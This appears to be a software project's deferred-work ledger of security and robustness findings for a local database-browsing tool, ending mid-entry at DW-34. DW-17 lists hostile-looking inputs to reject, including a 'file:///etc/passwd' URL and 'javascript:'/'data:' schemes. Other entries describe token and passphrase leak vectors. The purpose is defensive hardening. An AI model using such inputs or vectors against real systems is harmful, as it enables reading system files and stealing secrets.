# Deferred Work

Append-only ledger of issues surfaced during review that are intentionally deferred (not caused by the current story, or out of its scope). Triaged later by focused attention.

### DW-1: Follow-up review still recommended for 4-2-persist-erd-layout after the review budget was exhausted
origin: review-budget-followup
source_spec: `spec-4-2-persist-erd-layout.md`
severity: low
reason: Review budget (3 cycles) was exhausted with the story finalized (status: done, verify green) while the review pass kept recommending an independent follow-up. The work was committed by bmad-loop run 20260710-224752-6cf5; this entry preserves the lingering follow-up recommendation for a deliberate later review.
decision: [2026-07-21, user] Do a single focused follow-up review of story 4-2 during the post-epic sweep (cheap; closes the lingering budget-exhaustion recommendation).
status: open

### DW-2: Harden the per-boot token against same-machine processes and add a Content-Security-Policy (with a nonce for the inline token script) once stories render database content

origin: migrated from legacy ledger (code review of spec-1-1-walking-skeleton.md), 2026-07-12
location: `src/core/server.ts` (GET / token handoff, `window.__QS_TOKEN__`)
reason: The token is served in cleartext at the ungated `GET /` (the spec's chosen browser handoff), so any local process can scrape it; and `window.__QS_TOKEN__` is script-readable, so a future stored-XSS in rendered DB data could exfiltrate it. Both matter only once data rendering (Epic 3/5) exists; the walking skeleton renders no untrusted data.
decision: [2026-07-21, user] Add a strict Content-Security-Policy NOW (default-src 'self', connect-src 'self', a nonce for the inline token script, no inline eval). Same-machine token hardening is a SEPARATE, lower-priority concern — not part of this item.
status: done 2026-07-22
resolution: resolved by sweep bundle dw-csp-app-shell-hardening

### DW-3: When data-carrying RPCs arrive, have the server map `decode()` failures on untrusted peer FrozenData to a typed `bad_request` (400) instead of letting them throw into the catch-all `internal_error` (500)

origin: migrated from legacy ledger (code review of spec-1-1-walking-skeleton.md), 2026-07-12
location: `decode` (FrozenData decode on the RPC server path)
reason: `decode` enforces producer-side invariants by throwing `TypeError`; that is correct for internal producers but wrong for untrusted inbound wire data. No RPC decodes untrusted FrozenData in story 1.1, so it is latent until Epic 3.
status: done 2026-07-15
resolution: already resolved: src/core/rpc.ts:122-246 — no RPC handler ingests/decodes untrusted FrozenData; the only decode() sites (src/shared/contract.ts:611-615 sandbox-inbound guard, src/shared/snapshot.ts:59-64) map failures to a validation `false`, never internal_error(500). The feared data-carrying-RPC → 500 path was never built.

### DW-4: Story 1.2's browser-open must target `http://127.0.0.1:<port>`, NOT `http://localhost:<port>`, or the Origin/Host gate rejects every RPC

origin: migrated from legacy ledger (code review of spec-1-1-walking-skeleton.md), 2026-07-12
location: `validateOrigin` (`src/core/server.ts`)
reason: `validateOrigin` requires an exact `127.0.0.1:<port>` Host match and treats `localhost` as a distinct (rejected) origin — per the spec's deliberate design. A `localhost` launch URL would make the app appear broken end-to-end with only a `forbidden_origin` error.
status: done 2026-07-15
resolution: already resolved: bin/quick-studio.ts:110 opens core.openUrl = deriveOpenUrl(bindHost,port), which returns http://127.0.0.1:<port> for the default bind (src/core/binding.ts:101-106) — never localhost.

### DW-5: Decouple the Ring-2 UI build from Ring-1 Core availability and stop rebuilding the UI on every boot (bundle at build time / cache) to protect the epic's ≤2s cold-start target

origin: migrated from legacy ledger (code review of spec-1-1-walking-skeleton.md), 2026-07-12
location: `startCore` / `buildUiBundle()` (`src/core/server.ts`)
reason: `startCore` awaits `buildUiBundle()`, so any UI TypeScript/build error currently aborts the whole Core (including the health channel), and every boot re-bundles. Acceptable for a skeleton; a cost/robustness concern for the run-mode and packaging stories (1.2, 1.7).
status: done 2026-07-15
resolution: already resolved: The UI is pre-bundled at build time into src/core/ui-bundle.generated.ts; startCore consumes the prebuilt bundle at src/core/server.ts:219 — no buildUiBundle()/Bun.build call at boot.

### DW-6: Decide the canonical frozen-date sub-second precision policy (truncate-to-ms vs preserve) before real DB timestamps arrive; the current ISO regex + calendar round-trip only support millisecond precision

origin: migrated from legacy ledger (code review of spec-1-1-walking-skeleton.md), 2026-07-12
location: `ISO_UTC_RE` / `assertIsoUtc` (frozen-date utilities)
reason: `ISO_UTC_RE` allows only 1–3 fractional digits and `assertIsoUtc` re-serializes through a JS `Date` (millisecond resolution), so Postgres/MySQL microsecond timestamps (`.123456Z`) would throw. No timestamps flow until Epic 1 story 1.3 / Epic 3, and fixing it correctly is a precision-policy decision, not a one-line regex widen.
decision: [2026-07-21, user] Truncate sub-second to milliseconds explicitly and DOCUMENT the policy (ms is sufficient for a browse/inspection tool; keeps the frozen-date model simple).
status: done 2026-07-22
resolution: resolved by sweep bundle dw-frozen-date-ms-precision-policy

### DW-7: Optionally add a max request-body guard (Content-Length limit) on `POST /rpc`

origin: migrated from legacy ledger (code review of spec-1-1-walking-skeleton.md), 2026-07-12
location: `POST /rpc` (`src/core/server.ts`, `await req.json()`)
reason: `await req.json()` buffers an unbounded body. Low risk for a single-user localhost tool (you would only DoS yourself), but a cheap hardening once multi-caller scenarios (Live Reports, Epic 6) appear.
status: done 2026-07-15
resolution: resolved by sweep bundle dw-rpc-request-body-guard

### DW-8: When story 1.2 makes the port user-configurable, handle the scheme-default ports (80/443) in `validateOrigin` — browsers omit the default port from `Host`/`Origin`, so the exact `host:port` authority match rejects every RPC

origin: migrated from legacy ledger (code review of spec-1-1-walking-skeleton.md), 2026-07-12
location: `validateOrigin` (`src/core/server.ts`, `expectedAuthority`)
reason: `validateOrigin` builds `expectedAuthority` as `${host}:${port}`, but a browser loading `http://127.0.0.1` (QS_PORT=80) sends `Host: 127.0.0.1` and `Origin: http://127.0.0.1` with no `:80`, so both comparisons fail and every RPC is rejected `forbidden_origin` (app dead-on-arrival). Story 1.1 defaults to ephemeral ports, so this is latent until 1.2 lets the user pin a port.
status: done 2026-07-15
resolution: already resolved: src/core/auth.ts:18,129 — HTTP_DEFAULT_PORT=80 and acceptBareHost=(boundPort===80) is applied to the wildcard/Host/Origin matches (auth.ts:140,155,166), so a browser omitting :80 is accepted; port 443 is N/A (Core is http-only).

### DW-9: When story 1.2 adds browser-open, do NOT hand the OS launcher `core.url` verbatim for a wildcard bind — `http://0.0.0.0:<port>` (and `http://[::]:<port>`) is a non-routable bind sentinel, not a navigable address; compute a display/open URL of `http://localhost:<port>` instead

origin: migrated from legacy ledger (code review of spec-1-6-localhost-binding-port-warning.md), 2026-07-12
location: `startCore` (`src/core/server.ts`, `core.url = http://${bindHost}:${boundPort}`)
reason: `startCore` builds `core.url = http://${bindHost}:${boundPort}`, so under `QS_HOST=0.0.0.0` the boot line prints `listening on http://0.0.0.0:<port>` and any future auto-open would target a dead URL. Truthful-but-unusable today (only the stderr listening line is affected); becomes a real dead-on-open defect once 1.2 wires browser-open. Bind host stays `0.0.0.0` for `Bun.serve`; only the surfaced URL needs the substitution.
status: done 2026-07-15
resolution: already resolved: src/core/binding.ts:90-107 deriveOpenUrl maps wildcard 0.0.0.0→127.0.0.1 and ::→[::1]; Core exposes it as openUrl (server.ts:599) distinct from the verbatim url, and bin/quick-studio.ts:110 hands the launcher core.openUrl.

### DW-10: Replace the English substring heuristic (`isNotFoundError`) that distinguishes a missing keychain entry (`not-found`) from an unreachable backend (`unavailable`) with typed error codes/kinds from `@napi-rs/keyring`, once the real per-platform error shapes are observed (CI Windows leg / Story 2.2)

origin: migrated from legacy ledger (code review of spec-2-1-keyring-spike.md), 2026-07-12
location: `isNotFoundError` (keyring spike wrapper)
reason: Both review layers flagged the substring match as locale-fragile and as the linchpin of the passphrase-fallback decision — on backends that throw NoEntry (e.g. Windows Credential Manager) rather than returning null, a genuine miss or a localized/reworded error could be misclassified. It currently fails safe (unknown → `unavailable`), and the tested Linux path returns null (never hits the throw branch), so the robust fix genuinely needs Windows-observed error data the local spike could not gather. Story 2.2 must not commit Windows to the keychain path until confirmed.
decision: [2026-07-21, user] Replace the English-substring heuristic with typed error codes/kinds from @napi-rs/keyring — observe the real per-platform error shapes in CI and map them (robust, locale-proof).
status: done 2026-07-23
resolution: resolved by sweep bundle dw-keychain-typed-error-and-empty-key

### DW-11: Validate the macOS keychain path for `@napi-rs/keyring` under Bun (a `macos-latest` CI leg + a decision-record row) before the product ships a signed macOS build that relies on the keychain key-management path

origin: migrated from legacy ledger (code review of spec-2-1-keyring-spike.md), 2026-07-12
location: CI matrix / `@napi-rs/keyring` (macos-latest leg, keychain round-trip)
reason: The product targets macOS (`bun.lock` ships all `@napi-rs/keyring-darwin-*` binaries) but Story 2.1's CI matrix is deliberately `ubuntu + windows` per spec, so the macOS Keychain round-trip and compiled-binary native load are unproven. GitHub macOS runners have notoriously locked keychains, making it exactly the leg most likely to need special provisioning; leaving it unvalidated means a macOS user could silently land on the passphrase fallback (or worse) with no per-platform go/no-go on record.
status: done 2026-07-17
resolution: resolved by sweep bundle dw-keychain-ci-platform-validation

### DW-12: Decide, in Story 2.2's key-load path, whether a keychain entry that round-trips as an empty string (`""`) should be treated as a valid key or rejected as effectively `not-found`; the Ring-1 wrapper currently returns `found` with `value: ""`

origin: migrated from legacy ledger (code review of spec-2-1-keyring-spike.md), 2026-07-12
location: `getSecret` (keyring spike wrapper)
reason: `getSecret` only maps `null`/`undefined` to `not-found`, so a stored empty string surfaces as a legitimate `found` result. That is faithful for a generic wrapper, but an empty AES-256 key is never valid; the guard belongs in Story 2.2's key validation, not in the spike wrapper (patching it here would risk masking a legitimately-stored empty value). Latent until the real store loads keys.
decision: [2026-07-21, user] Treat a keychain entry that round-trips as "" as effectively not-found (reject it; fall back to re-create/passphrase). An empty encryption key is never legitimate.
status: done 2026-07-23
resolution: resolved by sweep bundle dw-keychain-typed-error-and-empty-key

### DW-13: In Story 2.2's durable keychain API, distinguish an invalid-argument error (e.g. empty/blank `service` or `account` making `new Entry()` throw) from a genuine backend-unavailable condition, rather than letting the wrapper's catch-all classify every non-not-found throw as `unavailable`

origin: migrated from legacy ledger (code review of spec-2-1-keyring-spike.md), 2026-07-12
location: `setSecret` / `getSecret` / `deleteSecret` (keyring spike wrapper)
reason: `setSecret`/`getSecret`/`deleteSecret` route any thrown error that isn't recognized as not-found straight to `unavailable`, so a programming error (bad service/account) would masquerade as a missing keychain backend and silently trigger Story 2.3's passphrase fallback instead of surfacing the bug. Harmless in Story 2.1 (service/account are hardcoded non-empty constants), but once 2.2 accepts caller-supplied identifiers an argument bug would be indistinguishable from a real keychain outage.
status: done 2026-07-17
resolution: resolved by sweep bundle dw-keychain-error-classification

### DW-14: Establish a single-writer guarantee for the credential store — either a cross-process file lock or an OS-level single-instance guard — before two concurrent Core instances (or a re-launch overlapping a slow shutdown) can silently clobber each other's writes or race the master-key generation

origin: migrated from legacy ledger (code review of spec-2-2-encrypted-credential-store.md), 2026-07-12
location: `credential-store.ts`; `store-key.ts` (`loadOrCreateStoreKey`)
reason: `credential-store.ts` loads the whole record set into an in-memory `Map` and, on each mutation, re-encrypts and atomically renames the entire file; there is no lock or read-modify-write reconciliation. Two live instances over the same dir → last flush wins, silently dropping the other's saved/deleted connections (lost update). Symmetrically, `store-key.ts` `loadOrCreateStoreKey` has a generate-on-`not-found` window where two processes each mint and store a different 32-byte key; the loser's already-encrypted file becomes permanently undecryptable (`corrupt`). Not triggered by Story 2.2 (single localhost Core, single user), but the first persistence substrate makes it latent for any future multi-instance/overlapping-launch scenario; the atomic rename prevents torn files but not lost updates or key races.
status: done 2026-07-15
resolution: resolved by sweep bundle dw-credential-store-single-writer

### DW-15: When Story 2.3 adds the passphrase fallback, give the "keychain key lost but store file present" case a distinct typed outcome (and a recovery hook) instead of surfacing it as `corrupt`, so it is not confused with malicious tampering and does not invite a destructive overwrite

origin: migrated from legacy ledger (code review of spec-2-2-encrypted-credential-store.md), 2026-07-12
location: `store-key.ts` (`loadOrCreateStoreKey`); `credential-store.ts` (`openCredentialStore`)
reason: `loadOrCreateStoreKey` mints a fresh CSPRNG key on any keychain `not-found` with no awareness that an encrypted `credential-store.enc` already exists. If the keychain entry is lost while the file survives (OS keychain reset, profile migration, Secret Service re-init, logout wipe), the next open generates a new key, decryption fails the auth tag, and `openCredentialStore` returns `corrupt` — indistinguishable from a tampered file. The data encrypted under the vanished key is already unrecoverable (inherent to AES-GCM with a lost key), so this is not data loss caused by Story 2.2, and the store never overwrites on open; but the misclassification and the absence of a "key-missing / file-present" recovery signal belong to Story 2.3's passphrase-fallback design (the sanctioned recovery path for a missing key). Distinct from the single-writer entry above (that is a concurrency/race issue; this is key-lifecycle vs file-lifecycle desync). NOTE: the legacy entry recorded this as later RESOLVED by Story 2.3 (spec-2-3) — the keychain reopen path now maps a regenerated key (`created`) over an existing `.enc` to the distinct typed `key-unavailable`, with the passphrase fallback as the sanctioned recovery path; sweep triage should verify against the current code before closing.
status: done 2026-07-15
resolution: already resolved: src/core/credential-store.ts:138-139 declares the distinct key-unavailable outcome, and 487-500 maps a regenerated key over an existing .enc to key-unavailable (not corrupt) as the sanctioned recovery signal — Story 2.3 resolved it.

### DW-16: Provide a non-env passphrase transport (stdin / file descriptor) for the keychain-unavailable fallback and document the `QS_PASSPHRASE` exposure, so the passphrase is not carried in the process environment on exactly the headless hosts the fallback targets

origin: migrated from legacy ledger (code review of spec-2-3-passphrase-fallback.md), 2026-07-12
location: `envPassphraseProvider` (`QS_PASSPHRASE`)
reason: `envPassphraseProvider` (the intent-contract-sanctioned default provider) reads the passphrase from the `QS_PASSPHRASE` environment variable. On a keychain-less/headless box this leaves the secret readable via `/proc/<pid>/environ` (same-user tooling), inherits it into every spawned child process, and can capture it in core dumps — a well-known env-secret leak vector, though it never touches disk or logs (the store's "never written/logged" invariant holds). The env seam is intentional and functional today; Story 2.4 adds the interactive UI prompt, and a stdin/fd provider plus a documented warning is the proper hardening. Not a bug in Story 2.3 (the env default is by design), but residual security surface worth focused attention before a wider release.
status: done 2026-07-15
resolution: resolved by sweep bundle dw-passphrase-nonenv-transport

### DW-17: When Story 1.3 wires the real DB connection, validate the Ephemeral database-URL's scheme/shape (allowlist `postgres`/`postgresql`/`mysql`), rejecting `file:`/`javascript:`/`data:` and Windows drive-path pseudo-URLs (`C:\db` parses as scheme `c:`) that Story 1.2's deliberately shallow `new URL()` shape-check lets through

origin: migrated from legacy ledger (code review of spec-1-2-one-command-run-mode-select.md), 2026-07-12
location: `parseCliArgs` (`src/core/cli-args.ts`)
reason: `parseCliArgs` validates the DB-URL positional only via `new URL(urlArg)` — which accepts any parseable URL — because engine/scheme validation and the actual connect belong to Story 1.3 (the spec scopes 1.2 to "shape only"). So today a nonsense-but-parseable positional (`file:///etc/passwd`, `C:\db.sqlite`) silently selects Ephemeral and carries a meaningless "URL" forward with no error. Not a bug in 1.2 (by-design deferral, and no connection is attempted here), but Story 1.3 is the sanctioned place to reject non-relational schemes with the "distinguishes host vs auth vs network" clear error the epic requires.
status: done 2026-07-15
resolution: already resolved: src/core/driver.ts:401-414 createDriver + schemeOf (384-390) lower-case and allowlist postgres/postgresql/mysql, rejecting file:/javascript:/data: and C:\db (protocol c:) as unsupported_scheme before any socket.

### DW-18: Add a distinct "database does not exist" connection-failure kind so a valid host+auth pointed at a nonexistent catalog (PG SQLSTATE `3D000`, MySQL `ER_BAD_DB_ERROR`/errno `1049`) is not misreported as `network` ("could not reach the database")

origin: migrated from legacy ledger (code review of spec-1-3-connect-postgres-mysql.md), 2026-07-12
location: `classifyConnectionError` (`src/core/driver.ts`); `ConnectionFailureKind` (`src/shared/contract.ts`)
reason: `classifyConnectionError` maps only auth/host/network codes and defaults everything else to `network`. `ConnectionFailureKind` has no bucket for invalid-catalog, so a user who authenticates fine but names a missing database sees the misleading "connection refused, reset, or timed out" message. Real but out of Story 1.3's stated host-vs-auth-vs-network 3-way scope: fixing it correctly means adding a new neutral failure kind to the shared contract (a design decision), not a one-line map widen.
status: done 2026-07-17
resolution: resolved by sweep bundle dw-connection-failure-taxonomy

### DW-19: Classify introspection (`listSchema`) failures that occur AFTER a successful handshake into the neutral `ConnectResult` taxonomy instead of letting a raw engine error escape as `internal_error` (HTTP 500)

origin: migrated from legacy ledger (code review of spec-1-3-connect-postgres-mysql.md), 2026-07-12
location: `driver-postgres.ts` / `driver-mysql.ts` (`listSchema`); `connection.ts` `open()` (lines 92, 104)
reason: The adapters (`driver-postgres.ts`/`driver-mysql.ts`) wrap only `connect()` errors via `toDriverConnectionError`; `listSchema()` throws raw. In `connection.ts` `open()`, a non-`DriverConnectionError` from `await d.listSchema()` (line 92) hits `throw err` (line 104) → `internal_error`. So an authenticated-but-unprivileged account that cannot read `information_schema`, or a connection dropped/reset mid-introspection, surfaces as an opaque 500 rather than a classified `status:"failed"`. Real, but the spec's golden shape deliberately re-throws non-classified errors as bugs and the current 4-kind enum has no natural bucket for a post-handshake permission/introspection error — so the fix is a taxonomy decision (adjacent to the invalid-catalog item above), not a trivial wrap. No live-DB test exercises the privileged-introspection path.
status: done 2026-07-15
resolution: resolved by sweep bundle dw-connection-introspection-robustness

### DW-20: Bound the introspection query itself (statement/query timeout) or race the connection manager's `close()` against a timer, so a hung `listSchema` cannot block shutdown indefinitely

origin: migrated from legacy ledger (code review of spec-1-3-connect-postgres-mysql.md), 2026-07-12
location: `connection.ts` `close()` (lines 143-150); driver adapters (information_schema query)
reason: `connection.ts` `close()` unconditionally `await`s the in-flight `open()` (lines 143-150) before tearing the driver down, and neither adapter sets a per-statement timeout on the `information_schema.columns` query. If `connect()` succeeds but the introspection query hangs (e.g. a lock on `information_schema`, a stalled server), `close()` never resolves → `Core.stop()` never completes → the port is never released. The postgres `connect_timeout: 10` and the new mysql `CLOSE_TIMEOUT_MS` teardown bound cover connect and teardown, but NOT a wedged query mid-introspection. Real edge; the fix touches the concurrency/shutdown-ordering model (racing inflight vs a bounded query timeout).
status: done 2026-07-15
resolution: resolved by sweep bundle dw-connection-introspection-robustness

### DW-21: Distinguish a malformed-but-supported-scheme URL from a genuinely unsupported scheme, so a bad/out-of-range port (or otherwise unparseable authority) on a `postgres`/`mysql` URL is not reported as `unsupported_scheme`

origin: migrated from legacy ledger (code review of spec-1-3-connect-postgres-mysql.md), 2026-07-12
location: `schemeOf` / `createDriver` (`src/core/driver.ts`)
reason: `schemeOf` reads the scheme via `new URL(url)`; when the URL is unparseable it returns `null`, and `createDriver` then rejects with `unsupported_scheme`. Confirmed at runtime: `new URL("postgres://host:5432x/db")` and `new URL("postgres://host:99999/db")` both throw `TypeError`, so a supported-scheme URL with a typo'd/out-of-range port yields the message "unsupported database URL scheme (expected postgres or mysql)" — a misleading verdict (the scheme IS supported; the URL is malformed). Real UX papercut, but the 4-kind failure enum has no "malformed URL" bucket, so a correct fix needs a taxonomy/message decision beyond the story's sanctioned wrong-scheme rejection (`file:`/`javascript:`/`data:`/Windows paths).
status: done 2026-07-17
resolution: resolved by sweep bundle dw-connection-failure-taxonomy

### DW-22: Surface a persistent `workspace.save` write-failure (disk full / EACCES / app dir removed mid-session) to the user instead of silently `void`-ing the reply, so a developer isn't led to believe their layout is being persisted when every save is failing

origin: migrated from legacy ledger (code review of spec-2-5-persist-workspace-state.md), 2026-07-12
location: `src/ui/App.tsx` (debounced `workspace.save`)
reason: The debounced save in `src/ui/App.tsx` does `void rpc<SaveWorkspaceResult>("workspace.save", …)` — the reply (including `internal_error` from a store `write-failed`, or `saved:false`) is discarded, with no retry and no notification. Real but layout-only (non-critical) data, and surfacing it correctly needs a UX decision (status stamp/toast) beyond Story 2.5's "restore Panel sizes + Tabs" scope; the terse mono status-bar stamp pattern from the epic UX notes is the natural home.
status: done 2026-07-15
resolution: resolved by sweep bundle dw-workspace-persistence-hardening

### DW-23: Constrain `panelSizes` to exactly two finite numbers in a sane range (e.g. [0,100]) at the workspace-store/registry validation boundary (or sanitize in the UI before it reaches `defaultSize`), so a hand-edited/legacy `workspace-state.json` cannot yield a broken initial split

origin: migrated from legacy ledger (code review of spec-2-5-persist-workspace-state.md), 2026-07-12
location: `isWorkspaceSnapshot` (`src/core/workspace-store.ts`); `checkPanelSizes` (`src/core/workspace-registry.ts`)
reason: `isWorkspaceSnapshot` and `checkPanelSizes` accept ANY-length finite-number array; `App.tsx` only special-cases the empty array. So `[42]`, `[10,20,30]`, or `[-5,105]` survive load/save and flow into `react-resizable-panels` `defaultSize`, producing a split that doesn't sum to 100 or exceeds a Panel's min/max. Unreachable in normal operation (`onLayout` always emits two values summing to 100) — tamper/legacy-file hardening only. Deferred over patched-now because "exactly 2" bakes in the current two-panel design and a future multi-panel layout would want variable length — a design decision, not a mechanical tighten.
status: done 2026-07-17
resolution: resolved by sweep bundle dw-workspace-snapshot-validation-hardening

### DW-24: Flush the pending debounced `workspace.save` on app quit / window unmount so the last layout or tab change made within `SAVE_DEBOUNCE_MS` (400ms) before Stop is not lost

origin: migrated from legacy ledger (code review of spec-2-5-persist-workspace-state.md), 2026-07-12
location: `src/ui/App.tsx` (save effect cleanup, `onStop`)
reason: The save effect cleanup in `src/ui/App.tsx` does `clearTimeout(handle)` with no flush, and `onStop` fires `shutdown` without draining the pending save; there is no `beforeunload` handler. A drag/open immediately followed by quit drops that final change. Narrow window and layout-only, but it's exactly the "last action" a user expects to survive; a correct flush-on-unmount in Electron needs a sync/beacon path, so it's a focused follow-up rather than a trivial patch.
status: done 2026-07-15
resolution: resolved by sweep bundle dw-workspace-persistence-hardening

### DW-25: Reconcile the `activeTabId: null`-with-tabs-present disagreement between the registry validator (accepts it as valid) and `restoreWorkspace` (rewrites it to the first tab), so a "no active tab" intent is not silently changed on restore

origin: migrated from legacy ledger (code review of spec-2-5-persist-workspace-state.md), 2026-07-12
location: `validateSnapshotParams` (`src/core/workspace-registry.ts`); `restoreWorkspace` (`src/ui/workspace/workspace-state.ts`)
reason: `workspace-registry.ts` `validateSnapshotParams` explicitly allows `activeTabId: null` even with tabs present (asserted in `workspace-registry.test.ts`), but `src/ui/workspace/workspace-state.ts` `restoreWorkspace` treats `null` as "not among the tabs" (`tabs.some(t => t.id === null)` is always false) and falls back to `tabs[0].id`. Only reachable via a hand-edited file (the live app never emits null-with-tabs), so a low-consequence validator/restore-normalization inconsistency to align deliberately.
status: done 2026-07-17
resolution: resolved by sweep bundle dw-workspace-snapshot-validation-hardening

### DW-26: Enforce tab-id uniqueness across `tabs` in the workspace-store/registry validation so a snapshot with duplicate ids cannot make `closeTab` remove two tabs at once

origin: migrated from legacy ledger (code review of spec-2-5-persist-workspace-state.md), 2026-07-12
location: `checkTabs` (`src/core/workspace-registry.ts`); `restoreWorkspace` (`src/ui/workspace/workspace-state.ts`)
reason: Neither `checkTabs` nor `restoreWorkspace` rejects duplicate ids; the `activeTabId` set-membership check dedupes and so doesn't catch it. `tabs:[{id:1,…},{id:1,…}]` restores verbatim, and `closeTab`'s `filter(t => t.id !== id)` then removes both. Reachable only via a hand-edited file — hardening, not a normal-operation bug (the pure model's monotonic `nextId` never mints duplicates).
status: done 2026-07-15
resolution: resolved by sweep bundle dw-workspace-persistence-hardening

### DW-27: Add a sequencing/generation guard (or single-flight) to `workspace.save` so two overlapping in-flight saves cannot land out of completion order and persist the older snapshot

origin: migrated from legacy ledger (code review of spec-2-5-persist-workspace-state.md), 2026-07-12
location: `src/ui/App.tsx`; `workspace-store.ts`
reason: `src/ui/App.tsx` can have a slow save S1 in flight when a newer change fires S2; the store (`workspace-store.ts`) uses a unique temp file + `rename` per save (no corruption), but there's no ordering guard, so if S2's rename lands before S1's the older snapshot wins. Low probability given fast local fs renames and the 400ms debounce; a monotonic save-generation check or single-flight-with-trailing would close it.
status: done 2026-07-15
resolution: resolved by sweep bundle dw-workspace-persistence-hardening

### DW-28: Preserve, rather than overwrite, an unreadable-but-newer-version `workspace-state.json` (e.g. a `version: 2` file opened by an older `version: 1` build) so a downgrade launch doesn't destroy a future build's saved state

origin: migrated from legacy ledger (code review of spec-2-5-persist-workspace-state.md), 2026-07-12
location: `isWorkspaceSnapshot` (`src/core/workspace-store.ts`)
reason: `isWorkspaceSnapshot` degrades a version mismatch to `null` (a *successful* load), so `App.tsx` enables saving and the first user change writes a `version: 1` snapshot over the `version: 2` file. The Story 2.5 data-loss patch only guards load *errors*, not a successful degrade-to-null. Spec explicitly allows "version-mismatch → fresh workspace", and `version: 2` does not exist yet, so this is a forward-compat hardening (e.g. back up or refuse-to-overwrite a newer-version file) for whenever the snapshot schema next changes.
status: done 2026-07-17
resolution: resolved by sweep bundle dw-workspace-snapshot-validation-hardening

### DW-29: Project the Postgres `Driver.query` read path from positional column descriptors instead of a name-keyed row object, so duplicate/aliased column names in a future raw-SQL result are not collapsed (MySQL's `rowsAsArray` path already returns positional arrays)

origin: migrated from legacy ledger (code review of spec-3-2-browse-rows-pagination.md), 2026-07-12
location: `driver-postgres.ts` (`query`, `cols.map(c => row[c.name])`)
reason: `driver-postgres.ts` `query` builds each row via `cols.map(c => row[c.name])` on postgres.js's name-keyed row object; two same-named result columns collapse to one value, and the two engines diverge (mysql2 uses `rowsAsArray:true`). The browse SELECT can never trigger it (single-table columns are unique), but `Driver.query`/`quoteIdent` is the shared seam the Story 3.6 raw-SQL path will reuse, where aliased/duplicate columns are common. Latent until raw SQL exists; the fix is an engine-adapter change (postgres.js `.values()`), not a browse-behavior bug.
status: done 2026-07-17
resolution: resolved by sweep bundle dw-postgres-positional-row-mapping

### DW-30: Type-color and align result-grid columns by their SQL `dataType` (numeric/decimal/bigint → number), not only by the neutral `FrozenCell` kind, so string-encoded numeric columns are not rendered as TEXT — the same SQL-type plumbing the deferred `t-json` color needs

origin: migrated from legacy ledger (code review of spec-3-2-browse-rows-pagination.md), 2026-07-12
location: `naturalKind` (`frozen-map.ts`); `DataGrid.tsx`
reason: postgres.js returns `numeric`/`decimal`/`int8` and mysql2 returns `DECIMAL`/`BIGINT` as JS strings (and `bigint` is deliberately forced to string for precision), so `naturalKind` in `frozen-map.ts` classifies them `string`; `DataGrid.tsx` then labels them `TEXT`, left-aligns, and drops `tabular-nums`. Values are correct — only the header type/alignment is wrong. The spec deliberately colors by neutral kind (and already defers `t-json` for the same reason); fixing both needs the SQL `dataType` carried alongside the result columns, a contract/plumbing decision beyond this story.
decision: [2026-07-21, user] Plumb each column's SQL dataType into the result contract and classify numeric/decimal/bigint -> number (right-align + number color), decoupled from the FrozenCell kind. (This resolves the previously-stuck "datatype-result-contract".)
status: open

### DW-31: Report a composite `SchemaTableInfo.primaryKey` in the key's own ordinal order (`ORDER BY ordinal_position` in both PK introspection queries) rather than in table-column order

origin: migrated from legacy ledger (code review of spec-3-2-browse-rows-pagination.md), 2026-07-12
location: `assembleSchema` (`driver.ts`, PK introspection queries)
reason: `assembleSchema` builds `primaryKey` by pushing PK column names in the columns query's schema/table/ordinal order gated by a membership Set, and neither the Postgres nor MySQL PK query orders by `ordinal_position`. For a composite PK whose key order differs from column order (PK `(b,a)` with `a` earlier in the table), `primaryKey` is `["a","b"]` — misreported. Pagination stays correct (the ORDER BY set is still total/deterministic) and the grid PK icon (membership-based) is unaffected, so it is invisible in Story 3.2; it matters once a consumer relies on PK column order (e.g. Story 3.3 row edit/where-clause construction).
status: done 2026-07-18
resolution: resolved by sweep bundle dw-introspection-query-fidelity

### DW-32: Acknowledge (and, if desired, mitigate with keyset/snapshot pagination) that the `table.rows` COUNT and page SELECT are two non-atomic round-trips, so `total` and page contents can disagree — and OFFSET pages can drift — under concurrent writes to the browsed table

origin: migrated from legacy ledger (code review of spec-3-2-browse-rows-pagination.md), 2026-07-12
location: `tableRows` (`server.ts`)
reason: `server.ts` `tableRows` issues `connectionManager.query(countSql)` then `query(selectSql)` with no shared snapshot/transaction; a concurrent insert/delete between them (or before the offset) makes `total` inconsistent with the returned page and shifts OFFSET-based pages. This is inherent to OFFSET pagination rather than a defect in the composition, and this is a read-only browse of a live DB (staleness is expected), so it is a known-limitation note rather than a Story 3.2 bug; keyset (seek) pagination on the PK is the durable fix if it becomes user-visible.
decision: [2026-07-21, user] Accept for now — DOCUMENT that total/page are a best-effort snapshot (local single-user browse tool); revisit with keyset pagination only if it bites. (No code fix beyond documentation.)
status: open

### DW-33: Make the keyless-table (no-PK) browse ordering robust — the static `UNORDERABLE_TYPE_PREFIXES` heuristic in `table-rows.ts` can both silently omit `ORDER BY` (rows overlap/skip across pages) and emit an `ORDER BY` the engine rejects (hard `internal_error`, blank grid), depending on the table's column types

origin: migrated from legacy ledger (code review of spec-3-2-browse-rows-pagination.md), 2026-07-12
location: `isOrderable` / `UNORDERABLE_TYPE_PREFIXES` (`src/core/table-rows.ts`)
reason: `isOrderable` classifies orderability by a hardcoded type-prefix denylist. For a PK-less table it either (a) filters out every column and omits `ORDER BY` entirely — so two separate page requests can return rows in different physical orders (overlap/skip, silent corrupt paging even with no concurrent writes) — or (b) passes a column that *looks* orderable but has no default ordering operator (Postgres `USER-DEFINED`/composite/`record`/`tsvector`/`pg_lsn`, `ARRAY`, or MySQL variants the prefix list misses such as `mediumblob`), so the composed `ORDER BY` throws at the DB and the whole page collapses to `internal_error` instead of degrading. Only affects keyless tables with exotic column types (PK tables order by the PK and are unaffected); the robust fix is a design decision — engine-aware orderability (which would leak ordering semantics into the driver seam), catch-and-degrade, or keyset pagination — not a mechanical widening of the prefix list. Distinct from the non-atomic COUNT/SELECT drift entry (that is concurrent-write staleness; this is a non-total page order / hard failure under zero writes).
decision: [2026-07-21, user] Use a physical row locator when the engine has one (Postgres `ctid`) for keyless-table ordering; otherwise order by the full set of orderable columns, and NEVER emit an ORDER BY the engine will reject (pre-validate by column type).
status: open

### DW-34: Decide how a `timestamp without time zone` value should be represented in the neutral FrozenCell model — `rowsToFrozenData` stamps a UTC `Z` ISO string on every JS `Date`, so a tz-less wall-clock timestamp is displayed as though it were UTC

origin: migrated from legacy ledger (code review of spec-3-2-browse-rows-pagination.md), 2026-07-12
location: `rowsToFrozenData` / `toIsoUtc` (`frozen-map.ts`)
